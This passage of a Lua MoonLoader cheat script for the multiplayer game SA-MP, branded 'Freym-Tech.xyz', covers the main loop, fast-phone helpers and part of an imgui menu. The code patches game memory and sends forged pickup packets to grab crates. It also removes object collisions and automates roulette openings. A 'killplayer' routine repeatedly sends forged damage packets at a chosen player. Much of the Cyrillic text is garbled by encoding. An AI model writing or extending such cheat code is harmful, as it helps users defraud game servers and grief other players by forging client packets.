			local x,y,z = getCharCoordinates(PLAYER_PED)
			local distance = tonumber(string.format("%.1f", getDistanceBetweenCoords3d(pickup_x, pickup_y, pickup_z, x,y,z)))
			if distance < 3 then
				printString('~G~lovim larec! Ostalos larcov: ~Y~'..tostring(larciwt)..'. ~G~Dialogs in sec: ~Y~'..tostring(#counter), 10)
				
				local x10, y10 = convert3DCoordsToScreen(pickup_x, pickup_y, pickup_z) -- ��� ������ � ������
                local x1, y1 = convert3DCoordsToScreen(larecpickup_x, larecpickup_y, larecpickup_z)
				if isPointOnScreen(larecpickup_x, larecpickup_y, larecpickup_z, 1.0) then
                	renderDrawLine(x10, y10, x1, y1, 0.5, 0xFFD00FF00)
				end
				if tonumber(larciwt) > 0 then 
					sampSendPickedUpPickup(lovlya_pickup)
					pressaltnow = true
					wait(50)
				end
			end
		end
		if v_lovlya then
			for k, v in ipairs(counter) do 
				if (os.clock() - v) > 1.0 then 
					table.remove(counter, k)
				end
			end
			local x,y,z = getCharCoordinates(PLAYER_PED)
			local distance = tonumber(string.format("%.1f", getDistanceBetweenCoords3d(v_pickup_x, v_pickup_y, v_pickup_z, x,y,z)))
			if distance < 1.5 then
				printString('~G~lovim larec! Ostalos videokart: ~Y~'..tostring('?')..'. ~G~Dialogs in sec: ~Y~'..tostring(#counter), 10)
				
				local x10, y10 = convert3DCoordsToScreen(v_pickup_x, v_pickup_y, v_pickup_z) -- ��� ������ � ������
                local x1, y1 = convert3DCoordsToScreen(videokartapickup_x, videokartapickup_y, videokartapickup_z)
				if isPointOnScreen(videokartapickup_x, videokartapickup_y, videokartapickup_z, 1.0) then
                	renderDrawLine(x10, y10, x1, y1, 0.5, 0xFFD00FF00)
				end
				sampSendPickedUpPickup(lovlya_videokart)
				pressaltnow = true
				wait(50)
			end
		end
		if goscreen then
			wait(1000)
			takeScreen()
			goscreen = false
		end
		if isCharInAnyCar(PLAYER_PED) then
			local carhandle = storeCarCharIsInNoSave(PLAYER_PED)
			local idcar = getCarModel(carhandle)
			if idcar == 520 then
				memory.setfloat(0x863984, 0.008)
			end
		else
			memory.setfloat(0x863984, 0.0099999997764826)
		end
		if sprint.v then
			if roulette.checked_radiofwafwa.v == 1 and isKeyDown(16) then
				setGameKeyState(16, 0)
				wait(0)
			end
			if roulette.checked_radiofwafwa.v == 2 and isKeyDown(32) then
				setGameKeyState(16, 0)
				wait(0)
			end
		end
		-- if isKeyDown(16) and isKeyDown(32) then
		-- 	setGameKeyState(16, 0)	
		-- end
		if not sampIsCursorActive() then
            if isKeyJustPressed(0x54) then
                sampSetChatInputEnabled(true)
            end
        end
		if wavecc.v then
			memory.fill(0x6E968A, 0x90, 2, true)
        	memory.fill(0x6E7210, 0x90, 4, true)
		end
		if inputefix.v then
			local samp = getModuleHandle("samp.dll")
			memory.fill(samp + 0x6B9FB, 0x90, 5, true)
		end
		if fixelploitmaver.v then
			memory.setuint32(0x736F88, 0, true)
		end
		if limitdorogalv.v then
			memory.fill(0x544CF0, 0x90, 14, true)
		end
		if deposit then
			setGameKeyState(10, 255)
			wait(100)
			setGameKeyState(10, 0)
		end
		if zhdputi.v then
			memory.setfloat(0x8D34AC, 0.0, true) 
		end
		if ctime.v then
			sampTextdrawCreate(221, "", roulette.dtimerosx.v, roulette.dtimerosy.v)
			sampTextdrawSetLetterSizeAndColor(221, 0.3, 1.7, 0xFFFFFFFF)
			sampTextdrawSetOutlineColor(221, 0.5, 0xFF000000)
			sampTextdrawSetAlign(221, 1)
			sampTextdrawSetStyle(221, 2)
			timerfwafawf = os.time() 
			sampTextdrawCreate(222, os.date("%H:%M:%S", timerfwafawf), roulette.dtimerosx.v + 85, roulette.dtimerosy.v)
			sampTextdrawSetLetterSizeAndColor(222, 0.3, 1.7, 0xFF87CEFA)
			sampTextdrawSetOutlineColor(222, 0.5, 0xFF000000)
			sampTextdrawSetAlign(222, 1)
			sampTextdrawSetStyle(222, 2)
		end
		if helicoptervinti.v then
			memory.fill(0x6C5107, 0x90, 59, true)
		end
		if mavericshar.v then
			local result, samp = loadDynamicLibrary("samp.dll")
			if result then 
			writeMemory(samp + 0xB0DE0, 0x02, 0xC390, true) 
			end
		end
		if pressaltnow then
			setGameKeyState(21, 255)
			wait(0)
			pressaltnow = false
		end
		
		textpressny = sampTextdrawGetString(2062)
		-- if textpressny:find('Press_N') then
		-- 	setGameKeyState(10, 256) -- N
		-- 	wait(5)
		-- 	setGameKeyState(10, 0) -- N
		-- end
		-- if textpressny:find('Press_Y') then
		-- 	setGameKeyState(11, 256)
		-- 	wait(5)
		-- 	setGameKeyState(11, 0)
		-- end
		-- if textpressny:find('Press_N') or textpressny:find('Press_Y') then
		-- 	setGameKeyState(10, 256) -- N
		-- 	wait(0)
		-- 	setGameKeyState(11, 256)
		-- 	wait(0)
		-- 	setGameKeyState(10, 0) -- N
		-- 	wait(0)
		-- 	setGameKeyState(11, 0)
		-- end
		if textpressny:find('Press_N') then
			setGameKeyState(10, 256) -- N
			wait(0)
			setGameKeyState(10, 0) -- N
		elseif textpressny:find('Press_Y') then
			setGameKeyState(11, 256)
			wait(0)
			setGameKeyState(11, 0)
		end
		if shar.v then
			textshar = sampTextdrawGetString(2069)
			if textshar:match("%[ ~p~%u+~w~ %]") then
				setGameKeyState(16, 255) -- SPACE
				setGameKeyState(21, 255) -- alt 
				setGameKeyState(9, 255)
				wait(0)
				setGameKeyState(16, 0) -- SPACE
				setGameKeyState(21, 0) -- alt
				setGameKeyState(9, 0)
			end
		end
		local incargg = isCharInAnyCar(PLAYER_PED)
		if stolbi.v and incargg then
			tbl2 = getAllObjects()
			if not (tbl2 == nil) then
				for k,v in ipairs(tbl2) do
					if doesObjectExist(v) then
						for _,z in ipairs(stolbiid) do
							if getObjectModel(v) == z then
								setObjectCollision(v, false)
							end
						end
					end
				end
			end
		end
		if isKeyJustPressed(45) then
			afksets.v = not afksets.v
		end
		if shlagbaum.v and incargg then -- ��� ��������
			tbl = getAllObjects()
			if not (tbl == nil) then
				for k,v in ipairs(tbl) do
					if doesObjectExist(v) then
						for _,z in ipairs(shlagbaumid) do
							if getObjectModel(v) == z then
								setObjectCollision(v, false)
							end
						end
					end
				end
			end
		end
		if ((isKeyDown(72) or isKeyDown(67)) and not sampIsChatInputActive()) or sampGetPlayerColor(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))) == 2152104628 then
			for _, g in pairs(getAllObjects()) do
				if isObjectOnScreen(g) then
					local model = getObjectModel(g)
					local _, x, y, z = getObjectCoordinates(g)
					local x1, y1 = convert3DCoordsToScreen(x,y,z)
					local x2,y2,z2 = getCharCoordinates(PLAYER_PED)
						local x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
						local distance = string.format("%.1f", getDistanceBetweenCoords3d(x, y, z, x2, y2, z2))
						local fixthis = distance - 0.1
					if model == 968 and fixthis < 12 and (isKeyDown(72) or isKeyDown(67)) and not sampIsChatInputActive() then
						opengate()
					end
					if model == 1495 and fixthis < 2.1 and (isKeyDown(72) or isKeyDown(67)) and not sampIsChatInputActive() then
						opengate()
					end
					if model == 1557 and fixthis < 1.7 and not sampIsChatInputActive() then
						opengate()
					end
				end
			end
		end
		if autosunduk and not processoplatafami then
			wait(400)
			funckthisshit()
			autosunduk = false
		end
		if unloadcars.v then
			local cars = getAllVehicles()
			for i = 1, #cars do
				local res, id = sampGetVehicleIdByCarHandle(cars[i])
				if res and cars[i] ~= 1 then
					hideCar(id)
				end
			end
		end
		if unloadpeds.v then
			local chars = getAllChars()
			for i = 1, #chars do
				local res, id = sampGetPlayerIdByCharHandle(chars[i])
				if res and chars[i] ~= 1 then
				hidePlayer(id)
				end
			end
		end
		if killplayer then
			local chars = getAllChars()
			for i = 1, #chars do
			local res, id = sampGetPlayerIdByCharHandle(chars[i])
				if res and chars[i] ~= 1 then
					if tonumber(id) == tonumber(killid) then
						sampSendGiveDamage(killid, 6.6000003814697, 0, 6)
						wait(killiddelay)
						AFKMessage('damaged id: '..killid)
					end
				end
			end
		end
		if enableperedai.v and settingsperedai.v then
			local chars1 = getAllChars()
			local mx, my, mz = getCharCoordinates(PLAYER_PED)
			for i,y in ipairs(chars1) do
				if doesCharExist(y) and y ~= PLAYER_PED then
					local vx, vy, vz = getCharCoordinates(y)
					local cDist = getDistanceBetweenCoords3d(mx, my, mz, vx, vy, vz)
					local rr, idff = sampGetPlayerIdByCharHandle(y)
					if idperedai.v == '' then

					else
						dwiojd = idff - idperedai.v
						if dwiojd == 0 then 
							if rr and cDist < 3.5 then
								dist1 = cDist
								nearId = idff
								sendmoneypereday()
							end
						end
					end
				end
			end
    	end
		if kursbitcoin.v or kurseuro.v or spcarstime.v then
			for j=0, 2048 do
				if sampIs3dTextDefined(j) then
					local text, color, posX, posY, posZ, distance, ignoreWalls, playerId, vehicleId = sampGet3dTextInfoById(j)
					if spcarstime.v then
						if text:find("����������� �����") or text:find("����������� ����") then
							if not text:find("����������� ����� Los Santos") then
							local numdwadawd = text:gsub(".+�����", ""):gsub("������!.+",""):gsub(" ","")
							spcars = numdwadawd
							activerender2 = 0
							end
						end
					end
					if kurseuro.v then
						if text:find("��������� ������a") then
							local numegegegege = text:gsub(".+{FFFFFF}", ""):gsub("%$","")
							num1222223 = numegegegege
							activerender = 0
						end
					end
					if kursbitcoin.v then
						if text:find("���� ��������") then
							local num2wafawf323 = text:gsub("\n������� N", ""):gsub("������� N","")
							ggwdadw = num2wafawf323
							activerender = 0
						end
					end
				end
			end
		end
		if kursbitcoin.v or kurseuro.v or spcarstime.v then
			if activerender2 < 2 then
				if spcarstime.v then
					renderFontDrawText(tex1t, "Spcars in: ",roulette.timerspx.v , roulette.timerspy.v, 0xFFFFFFFF)
					renderFontDrawText(salary, spcars, roulette.timerspx.v + 85, roulette.timerspy.v - 10, 0xFFCC8C51)
				end
			end
			if activerender < 2 then
				if kurseuro.v then
					renderFontDrawText(tex1t, "Euro:",roulette.bitcoinandeurox.v , roulette.bitcoinandeuroy.v, 0xFFFFFFFF)
					renderFontDrawText(salary, num1222223.. " $", roulette.bitcoinandeurox.v + 45, roulette.bitcoinandeuroy.v - 10, 0xFFCC8C51)
				end
				if kursbitcoin.v then
				renderFontDrawText(salary2, ggwdadw, roulette.bitcoinandeurox.v, roulette.bitcoinandeuroy.v - 100, 0xFFCC8C51)
				end
			end
			if (activerender < 3 or activerender2 < 3) then
				activerender = activerender + 1
				activerender2 = activerender2 + 1
			end
		end
			if idsshow then
            local alltextdraws = sampGetAllTextDraws()
            for _, v in pairs(alltextdraws) do
                local fX,fY = sampTextdrawGetPos(v)
                local fX,fY = convertGameScreenCoordsToWindowScreenCoords(fX,fY)	
                renderFontDrawText(font2,tostring(v),tonumber(fX),tonumber(fY),0xD7FFFFFF)
            end
		end
		if lovlya then
			for f=0, 2048 do
				if sampIs3dTextDefined(f) then		
					local text, color, posX, posY, posZ, distance, ignoreWalls, playerId, vehicleId = sampGet3dTextInfoById(f)
					if text:find('����� Concept Car Luxury') then
						local text = text:gsub('{C87D6D}', ""):gsub("{ffffff}","")
						larciwt = text:match('� �������: (%d+)')
					end
				end
			end
		end
		------------------------------------standart RULETTE---------------
		if checkopen.standart and roulette.standart.v then
			if is_opening == false then
				wait(500)
				checkopen.standart = false
				if standardactive then
					close = true	
					is_opening = false
				else
					is_opening = true
					AFKMessage('[standart] ��������� �����')
					wait(500)
					sampSendClickTextdraw(opentimerid.standart)
					wait(500)
					sampSendClickTextdraw(2302)
					close = true
					wait(500)
					is_opening = false
				end	
				if not checkopen.donate and not checkopen.platina and not checkopen.ilon and not checkopen.lossantos then --and not checkopen.valentin
					wait(500)
					textdrawhide = false
					pidarasfix = true
					sampSendClickTextdraw(idclose)
					if stopopen then
						aopen = false
						lua_thread.terminate(rulethandle) 
						stopopen = false
					end
				end
			end
		end
		------------------------------------donate rulette---------------
		if checkopen.donate and roulette.donate.v then
			if is_opening == false then
				checkopen.donate = false
				if donateactive then
					close = true	
					is_opening = false
				else
					is_opening = true
					AFKMessage('[donate] ��������� �����')
					wait(500)
					sampSendClickTextdraw(opentimerid.donate) 
					wait(500)
					sampSendClickTextdraw(2302)
					close = true
					wait(500)
					is_opening = false
				end
				if not checkopen.standard and not checkopen.platina and not checkopen.ilon and not checkopen.lossantos then -- and not checkopen.valentin
					wait(500)
					textdrawhide = false
					pidarasfix = true
					sampSendClickTextdraw(idclose)
					if stopopen then
						aopen = false
						lua_thread.terminate(rulethandle) 
						stopopen = false
					end
				end
			end
		end
		if finished == false then
			sendvrchat()
		end
		------------------------------------platina rulette---------------
		if checkopen.platina and roulette.platina.v then
			if is_opening == false then
				checkopen.platina = false
				if platinaactive then
					close = true
					is_opening = false
				else
					is_opening = true
					AFKMessage('[platina] ��������� �����')
					wait(500)
					sampSendClickTextdraw(opentimerid.platina) 
					wait(500)
					sampSendClickTextdraw(2302)
					close = true
					wait(500)
					is_opening = false
				end
				if not checkopen.standard and not checkopen.donate and not checkopen.ilon and not checkopen.lossantos then -- and not checkopen.valentin 
					wait(500)
					textdrawhide = false
					pidarasfix = true
					sampSendClickTextdraw(idclose)
					if stopopen then
						aopen = false
						lua_thread.terminate(rulethandle) 
						stopopen = false
					end
				end
			end
		end
		------------------------------------ilon rulette------------
		if checkopen.ilon and roulette.ilon.v then
			if not roulette.platina.v and not roulette.donate.v and not roulette.standart.v and not roulette.lossantos.v then
				wait(500)
				if is_opening == false then
					checkopen.ilon = false
					if ilonactive then
						close = true
						is_opening = false
					else
						is_opening = true
						AFKMessage('[Ilon] ��������� �����')
						wait(500)
						sampSendClickTextdraw(opentimerid.ilon) 
						wait(500)
						sampSendClickTextdraw(2302)
						close = true
						wait(500)
						is_opening = false
					end
					if not checkopen.standard and not checkopen.donate and not checkopen.platina and not checkopen.lossantos then -- and not checkopen.valentin 
						wait(500)
						textdrawhide = false
						pidarasfix = true
						sampSendClickTextdraw(idclose)
						if stopopen then
							aopen = false
							lua_thread.terminate(rulethandle) 
							stopopen = false
						end
					end
				end
			else
				if is_opening == false then
					checkopen.ilon = false
					if ilonactive then
						close = true
						is_opening = false
					else
						is_opening = true
						AFKMessage('[Ilon] ��������� �����')
						wait(500)
						sampSendClickTextdraw(opentimerid.ilon) 
						wait(500)
						sampSendClickTextdraw(2302)
						close = true
						wait(500)
						is_opening = false
					end
					if not checkopen.standard and not checkopen.donate and not checkopen.platina and not checkopen.lossantos then -- and not checkopen.valentin 
						wait(500)
						textdrawhide = false
						pidarasfix = true
						sampSendClickTextdraw(idclose)
						if stopopen then
							aopen = false
							lua_thread.terminate(rulethandle) 
							stopopen = false
						end
					end
				end
			end
		end
		---------------------------------------------lossantos----------------------------------------
		
		if checkopen.lossantos and roulette.lossantos.v then
			if is_opening == false then
				checkopen.lossantos = false
				if lossantosactive then
					close = true
					is_opening = false
				else
					is_opening = true
					AFKMessage('[lossantos] ��������� �����')
					wait(500)
					sampSendClickTextdraw(opentimerid.lossantos) 
					wait(500)
					sampSendClickTextdraw(2302)
					close = true
					wait(500)
					is_opening = false
				end
				if not checkopen.standard and not checkopen.donate and not checkopen.ilon and not checkopen.platina then -- and not checkopen.valentin 
					wait(500)
					textdrawhide = false
					pidarasfix = true
					sampSendClickTextdraw(idclose)
					if stopopen then
						aopen = false
						lua_thread.terminate(rulethandle) 
						stopopen = false
					end
				end
			end
		end
    end
end
function opengate()
	if opengateo then
		lua_thread.create(function ()
			opengateo = false
			sampSendChat('/opengate')
			wait(200)
			opengateo = true
		end)
	end
end
-------------------------------------------fastphone-----------------------------------------------------

local function magiclines(s) if s:sub(-1)~="\n" then s=s.."\n" end return s:gmatch("(.-)\n") end
function sampev.onTextDrawSetString(id, text)
	if text == '- Harrison St.' then -- train bot
		info['state'] = 'gas'
	end
	if text == '/05' then
		newidcount = id + 1
	end
	if id == newidcount then
		info['pickUp'] = points[tonumber(text)]
		info['point'] = tonumber(text)
		print('Point: '..tonumber(text))
	end
	if text:len() == enterednum+1 and text:sub(enterednum+1, enterednum+1) == last_entered then
		lua_thread.create(function()
		enterednum = enterednum + 1
		local i = 0
		local id = -1
		if safemode.v then
			local ok, idmy = sampGetPlayerIdByCharHandle(PLAYER_PED)
			local ping = sampGetPlayerPing(idmy)
			wait(ping + 15)
		end
		for S in string.gmatch(calwwwl, "%d") do
			if enterednum == i then
				id = S
			end
			i = i + 1
		end
		if id == -1 then
			if whoru.v == 'Google Pixel 3' then
				callphonnebutton = origdwa - 18
			else
				callphonnebutton = origdwa - 17
			end
			
			sampSendClickTextdraw(callphonnebutton)
			enterednum = -1
			last_entered = nil
			return
		end
		
		last_entered = id
		sampSendClickTextdraw(phone[id])
		end)
	end
end
function checkadm()
	lua_thread.create(function()
		wait(1500)
		if checkadmd then
			functionnumber = false
			ignoreallphones = false
			AFKMessage('��������� �����-�� ������ �������, ���������� ��� ��� ��� ������� ������ id.')
			checkadmd = false
		end
	end)
end
function numbercall()
	while true do
		wait(0)
		fastphoneenw = true
		sampSendChat("/phone")
		wait(200)
		if telefongotov then
			wait(400)
			if vseoke then
				nextphonecalll = false
				vseoke = false
				wait(300)
				telefongotov = false
				threadend = true
			end
		else
			wait(70)
		end
	end
end
function numbercalln()
	while true do
		wait(0)
		fastphoneen = true
		sampSendChat("/phone")
		wait(200)
		if telefongotov then
			wait(400)
			if vseoke then
				nextphonecalll = false
				if not (calwwwl == nil) then
					for S in string.gmatch(calwwwl, "%d") do
						last_entered = S
						sampSendClickTextdraw(phone[S])
						enterednum = 0
						break
					end
				else
					AFKMessage('��������� �����-�� ������ �������, ���������� ��� ���.')
					sampSendChat("/phone")
				end
				vseoke = false
				
				wait(300)
				threadendn = true
				telefongotov = false
			end
		else
			wait(70)
		end
	end
end
function lgbt1(param)
	local id1 = tonumber(param)
	if id1 ~= nil then
		if not (whoru.v == '') then
			if id1 < 1000 and id1 > -1 then
				if id1 ~= nil then
					functionnumber = true
					ignoreallphones = true
					checkadmd = true
					checkadm()
					sampSendChat("/number "..id1)
					numbercallid = id1
				end
			else
				AFKMessage('������ �������� ������ 999 ��� ������ 0.')
			end
		else
			sampShowDialog(10000, "{FFFFFF}��������� {FFFF00}FastPhone {FFFFFF}(������ �������: {FFFF00}"..whoru.v.."{FFFFFF})", "{FFFFFF}������� ����� �������� � ������ {FF9933}������� ����������� ����{FFFFFF}.\n{FFFFFF}1. IPHONE X\n2. Samsung Galaxy S10\n3. Google Pixel 3\n4. Huawei P20 PRO\n5. Xiaomi Mi 8\n{FF4141}�� �� ��������� ������� ������� �� ������ �� ������������ ��� ������!", "�������", "�������", 1)
		end	
	else
		AFKMessage('����������� /call id')
	end
end
function lgbt2(param)
	local id1 = param
	if id1 ~= nil then
		if not (whoru.v == '') then
			local nl = id1:len()
			if nl > 0 then
				calwwwl = id1
				callfornum = true
				ignoreallphones = true
				AFKMessage("����� �� �����:{FFFFFF} {6495ED}"..calwwwl.."{FFFFFF}.")
				numbercallln = lua_thread.create(numbercalln)
			else
				AFKMessage('������ ������������ �����.')
			end
		else
			sampShowDialog(10000, "{FFFFFF}��������� {FFFF00}FastPhone {FFFFFF}(������ �������: {FFFF00}"..whoru.v.."{FFFFFF})", "{FFFFFF}������� ����� �������� � ������ {FF9933}������� ����������� ����{FFFFFF}.\n{FFFFFF}1. IPHONE X\n2. Samsung Galaxy S10\n3. Google Pixel 3\n4. Huawei P20 PRO\n5. Xiaomi Mi 8\n{FF4141}�� �� ��������� ������� ������� �� ������ �� ������������ ��� ������!", "�������", "�������", 1)
		end	
	else
		AFKMessage('����������� /calln number')
	end
end
function on_fastssms(id)
	if id == '' then
		sampSendChat('/sms')
		return
	end
	id = tonumber(id)  
	if not id or id < 0 or id > 999 then
		AFKMessage('������ �������� ������ 999 ��� ������ 0.')
		return
	end
	local nick = tostring(sampGetPlayerNickname(id))
	if nick then
		sendid = id
		pending_msg = nick
		sampSendChat('/sms')
		return true
	end
end

function on_fastgeo(id)
	if not (whoru.v == '') then
		id = tonumber(id)
		if not id or id < 0 or id > 999 then
			AFKMessage("�� ����� �������� id.")
			return
		end
		local nick = tostring(sampGetPlayerNickname(id))
		interiowfr = getActiveInterior()
		if interiowfr > 0 then
			AFKMessage("�� ������� ��������� ���������� ������ {FFFF00}" .. tostring(nick) .. " {FFFFFF}(�� ���������� � ���������) ")
			return
		end
		if nick then
			pending_geo = nick
			sampSendChat('/phone')
			return true
		end
	else
		sampShowDialog(10000, "{FFFFFF}��������� {FFFF00}FastPhone {FFFFFF}(������ �������: {FFFF00}"..whoru.v.."{FFFFFF})", "{FFFFFF}������� ����� �������� � ������ {FF9933}������� ����������� ����{FFFFFF}.\n{FFFFFF}1. IPHONE X\n2. Samsung Galaxy S10\n3. Google Pixel 3\n4. Huawei P20 PRO\n5. Xiaomi Mi 8\n{FF4141}�� �� ��������� ������� ������� �� ������ �� ������������ ��� ������!", "�������", "�������", 1)
	end
end
function on_superfast_sms(args)
	local id = args:gsub('%s.+', '')
	if id:len() == args:len() then
		AFKMessage("����������� /ssms id ���������.")
		return
	end

	local msg = args:gsub('^' .. tostring(id) .. '%s', '')
	if msg:len() == 0 then
		AFKMessage("����������� /ssms id ���������.")
		return
	end

	if msg:len() > 30 then
		AFKMessage("���� ��������� ������ 30 ����.")
		return
	end

	if on_fastssms(id) then
		pending_superfast_sms = tostring(msg)
		pending_superfast = 3
		
	end
end
-------------------------------------------fastphone-----------------------------------------------------




function onScriptTerminate(scr,qgame) --eror
	if scr == thisScript() then
		if idpickup_destroy ~= -1 then 
			removePickup(idpickup_destroy)
		end
		if v_idpickup_destroy ~= -1 then 
			removePickup(v_idpickup_destroy)
		end
		thisScript():reload()
	end
end
function onWindowMessage(msg, wparam, lparam)
	if msg == 0x100 or msg == 0x101 then
		if (wparam == 0x1B and afksets.v) and not isPauseMenuActive() then
			consumeWindowMessage(true, false)
			if msg == 0x101 then
				afksets.v = false
			end
		end
	end
	if dualmonitor.v then
		if msg == wm.WM_KILLFOCUS then
				ffi.C.GetClipCursor(rcOldClip);
				ffi.C.ClipCursor(rcOldClip);
			elseif msg == wm.WM_SETFOCUS then
				ffi.C.GetWindowRect(ffi.C.GetActiveWindow(), rcClip);
				ffi.C.ClipCursor(rcClip);
		end
	end
end
function dibil()
	sampSendTakeDamage(65535, 100, 51, 3)
	-- setCharHealth(PLAYER_PED, 50)
end
function sampGetAllTextDraws()
	local tds = {}
	pTd = sampGetTextdrawPoolPtr() + 9216
	for i = 0,2303 do
		if readMemory(pTd + i*4,4) ~= 0 then
			table.insert(tds,i)
		end
	end
	return tds
end
function imgui.OnDrawFrame()
	if afksets.v then
		
		local sw, sh = getScreenResolution()
		imgui.SetNextWindowSize(imgui.ImVec2(900,arec.sizemenu.v))
		imgui.SetNextWindowPos(imgui.ImVec2(sw/2,sh/2),imgui.Cond.FirstUseEver,imgui.ImVec2(0.5,0.5)) -- �������� � ������
		imgui.Begin('Freym-Tech.xyz | version :'..thisScript().version,afksets,imgui.WindowFlags.NoResize + imgui.WindowFlags.MenuBar + imgui.WindowFlags.NoCollapse)
		if imgui.BeginMenuBar() then
			if imgui.MenuItem(u8('���������')) then menunum = 0 end
			if imgui.MenuItem(u8('����')) then menunum = 8 end
			if imgui.MenuItem(u8('����-�����')) then menunum = 2 end
			if imgui.MenuItem(u8('�������-�������')) then menunum = 1 end
			if imgui.MenuItem(u8('��� �������/�������')) then menunum = 3 end
			if imgui.MenuItem(u8('�������� ����.')) then menunum = 9 end
			-- if imgui.MenuItem(u8('Changelog')) then os.execute('explorer https://freym-tech.xyz/contentj/Changelog.js') end
			-- if imgui.MenuItem(u8('�����-������������')) then os.execute('explorer https://freym-tech.xyz/nalogcalc') end
			-- if imgui.MenuItem(u8('������ ����� �����')) then os.execute('explorer https://freym-tech.xyz/captcha') end
			imgui.EndMenuBar()
		end
		if menunum == 0 then
			imgui.BlockElements(u8('������������ �������'),function()
				imgui.Checkbox(u8('��������� �������� ������'),roulette.standart); imgui.SameLine() imgui.TextQuestion(u8('��� ����������� ���������� �������� ����������� ������ ������ ���� � 1 ����� �� 1 ��������')) 
				imgui.Checkbox(u8('��������� ����� ������'),roulette.donate); imgui.SameLine() imgui.TextQuestion(u8('[�����������!] �������� ������ ������ ���� �� 2 ����� �� 1 ��������'))
				imgui.Checkbox(u8('��������� ������� ������'),roulette.platina); imgui.SameLine() imgui.TextQuestion(u8('[�����������!] ���������� ������ ������ ���� � 3 ����� �� 1 ��������'))
				imgui.Checkbox(u8('��������� ���� ������'),roulette.ilon); imgui.SameLine() imgui.TextQuestion(u8('[�����������!] ���� ������ ������ ���� � 4 ����� �� 1 ��������'))
				imgui.Checkbox(u8('��������� ���-������ ������'),roulette.lossantos); imgui.SameLine() imgui.TextQuestion(u8('[�����������!] ���� ������ ������ ���� � 5 ����� �� 1 ��������'))
				--imgui.Checkbox(u8('��������� ������ ������� ���������'),roulette.valentin); imgui.SameLine() imgui.TextQuestion(u8('[�����������!] C����� ������� ��������� ������ ���� � 4 ����� �� 1 ��������'))
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('�������� (� ���.)'),roulette.wait)
				imgui.SameLine()
				imgui.TextQuestion(u8('�������� ����� ����� ��������� �������(����� ������� ��� ���)'))
				imgui.PopItemWidth()
				if imgui.Button(u8('��������/��������� ������������ ��������')) then 
					openchestrullet()
				end
				imgui.SameLine()
				imgui.Checkbox(u8('������ �������� ��� ������.'), autoriletki)
				-- imgui.SameLine()
				--imgui.Checkbox(u8('� ����� � ��� �������� �������.'), launcherplayer)
				imgui.Checkbox(u8('��������� ������� ���������� ��������� �������.'), statsrul)
				if statsrul.v then
					imgui.Separator()
					if sampIsLocalPlayerSpawned() then
						-- imgui.PushItemWidth(150)
						-- imgui.Combo(u8'������������� ���� �� ������� ',arec.viborserveraedit,namesserveredit)
						-- AFKMessage(rullsumm[getServer()]['summrulbronze'])
						imgui.Text(u8'������ �� �� �������. ��� ��������� �� ��� ����� ������� �� ����������.')
						imgui.Separator()
						imgui.Text(u8"������ ��������� �������: "..tostring(rullsumm[getServer()]["summrulbronze"]).."")  if sellcenabronse.v == '' then imgui.SameLine() imgui.Text(u8"�� �� ����� �������� � ������ �����!") else imgui.SameLine() imgui.Text(u8"����. � ��� ����������: "..tonumber(rullsumm[getServer()]["summrulbronze"]) * sellcenabronse.v) imgui.SameLine() imgui.Text(u8"$") end
						imgui.Text(u8'������ ���������� �������: '..tostring(rullsumm[getServer()]["summrulsera"])..'') if sellcenasera.v == '' then imgui.SameLine() imgui.Text(u8"�� �� ����� �������� � ������ �����!") else imgui.SameLine() imgui.Text(u8"����. � ��� ����������: "..tonumber(rullsumm[getServer()]["summrulsera"]) * sellcenasera.v) imgui.SameLine() imgui.Text(u8"$") end
						imgui.Text(u8'������ ���� �������: '..tostring(rullsumm[getServer()]["summrulgold"])..'') if sellcenagold.v == '' then imgui.SameLine() imgui.Text(u8"�� �� ����� �������� � ������ �����!") else imgui.SameLine() imgui.Text(u8"����. � ��� ����������: "..tonumber(rullsumm[getServer()]["summrulgold"]) * sellcenagold.v) imgui.SameLine() imgui.Text(u8"$") end
						imgui.Text(u8'������ ������� �������: '..tostring(rullsumm[getServer()]["summrulplatina"])..'') if sellcenaplatina.v == '' then imgui.SameLine() imgui.Text(u8"�� �� ����� �������� � ������ �����!") else imgui.SameLine() imgui.Text(u8"����. � ��� ����������: "..tonumber(rullsumm[getServer()]["summrulplatina"]) * sellcenaplatina.v) imgui.SameLine() imgui.Text(u8"$") end
						imgui.Separator()
						imgui.Text(u8'������ �������� ����� � �������: '..tostring(rullsumm[getServer()]["summrullarecpremka"])..'') if sellcenaprem.v == '' then imgui.SameLine() imgui.Text(u8"�� �� ����� �������� � ������ �����!") else imgui.SameLine() imgui.Text(u8"����. � ��� ����������: "..tonumber(rullsumm[getServer()]["summrullarecpremka"]) * sellcenaprem.v) imgui.SameLine() imgui.Text(u8"$") end
						imgui.Text(u8'������ �������� ����� Super Car Box: '..tostring(rullsumm[getServer()]["summrullarecsuper"])..'') if sellcenacarbox.v == '' then imgui.SameLine() imgui.Text(u8"�� �� ����� �������� � ������ �����!") else imgui.SameLine() imgui.Text(u8"����. � ��� ����������: "..tonumber(rullsumm[getServer()]["summrullarecsuper"]) * sellcenacarbox.v) imgui.SameLine() imgui.Text(u8"$") end
						imgui.Separator()
						-- imgui.Text(u8'������� � ����� ����� ��������: '..tostring(rullsumm[getServer()]["summrulplatina"])..'') if sellcenabronse.v == '' then imgui.SameLine() imgui.Text(u8"�� �� ����� �������� � ������ �����!") else imgui.SameLine() imgui.Text(u8"����. � ��� ����������: "..tonumber(rullsumm[getServer()]["summrulloli"]) * sellcenaoli.v) imgui.SameLine() imgui.Text(u8"$") end
						-- imgui.Separator()
						-------------------alllllllllllllllllllll---------------------
						if sellcenabronse.v == '' or sellcenasera.v == '' or sellcenagold.v == '' or sellcenaplatina.v == '' or sellcenaprem.v == '' or sellcenacarbox.v == '' then
							imgui.Text(u8'� ����� �� ����� �� ��������� ������� ���������� � ���� ����.')
							imgui.Separator()
						else
							local fst = tonumber(rullsumm[getServer()]["summrulbronze"]) * sellcenabronse.v
							local tw = tonumber(rullsumm[getServer()]["summrulsera"]) * sellcenasera.v
							local th = tonumber(rullsumm[getServer()]["summrulgold"]) * sellcenagold.v
							local fwfk = tonumber(rullsumm[getServer()]["summrulplatina"]) * sellcenaplatina.v
							local fwon = tonumber(rullsumm[getServer()]["summrullarecpremka"]) * sellcenaprem.v
							local fiown = tonumber(rullsumm[getServer()]["summrullarecsuper"]) * sellcenacarbox.v
							local allsunnm = fst + tw + th + fwfk + fwon + fiown
							imgui.Text(u8'����� ���������� �� ���� �������: '..allsunnm..' $')
							imgui.Separator()
						end
						------------------allllllllllllllllllll--------------------
